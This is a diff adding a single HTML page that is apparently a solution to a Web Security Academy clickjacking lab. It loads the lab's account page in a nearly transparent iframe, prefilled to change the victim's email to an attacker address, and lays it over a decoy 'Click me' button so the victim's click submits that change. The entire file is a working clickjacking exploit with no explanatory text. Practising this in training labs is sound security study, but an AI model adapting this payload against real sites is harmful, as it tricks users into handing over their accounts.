@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+        #target_website{
+            position: relative;
+            width: 800px;
+            height: 600px;
+            opacity: 0.00001;
+            z-index: 2;
+        }
+        #decoy_website{
+            position:absolute;
+            width:300px;
+            height:400px;
+            z-index:1;
+            top: 450px;
+            left: 40px;
+            }
+        
+        </style>
+    </head>
+
+
+<body>    
+    <div id="decoy_website">
+        <button class="button" type="submit">Click me</button>
+    </div>
+
+    <iframe id="target_website" sandbox="allow-forms" src="https://0af4001e04bcf4e381d47fe4001f002f.web-security-academy.net/my-account?email=hacker@fastmail.com"></iframe>
+</body>
+</html>
